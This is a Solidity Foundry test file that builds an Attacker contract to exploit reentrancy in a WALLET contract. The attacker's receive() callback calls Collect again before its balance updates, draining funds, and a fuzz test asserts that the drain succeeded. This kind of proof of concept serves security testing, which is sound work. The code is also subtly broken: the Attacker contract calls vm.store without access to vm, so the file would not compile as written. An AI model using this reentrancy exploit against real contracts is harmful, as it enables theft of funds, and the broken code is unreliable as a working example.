
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET} from "../src/WALLET.sol";
import {Log} from "../src/Log.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyWALLET is Test {
    using stdStorage for StdStorage;

    WALLET public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new WALLET(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 0.5 ether && attackVal <= type(uint128).max / 2);
        
        uint256 attackerInitialBalance = 2 * attackVal;
        uint256 walletInitialBalance = 2 * attackVal;
        
        vm.deal(address(_contractUnderTest), walletInitialBalance);
        vm.deal(address(_attacker), attackerInitialBalance);
        vm.deal(address(this), attackerInitialBalance);

        _attacker.setupAttack{value: attackerInitialBalance}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        uint256 currentTime = block.timestamp;
        _victim.Put{value: msg.value}(currentTime);
        
        uint256 attackerSlot = uint256(keccak256(abi.encode(address(this), uint256(2))));
        vm.store(address(_victim), bytes32(attackerSlot), bytes32(uint256(0)));
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        
        _victim.Collect(val);
        
        if (address(this).balance >= initialSnapshot + (storedAttackVal * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
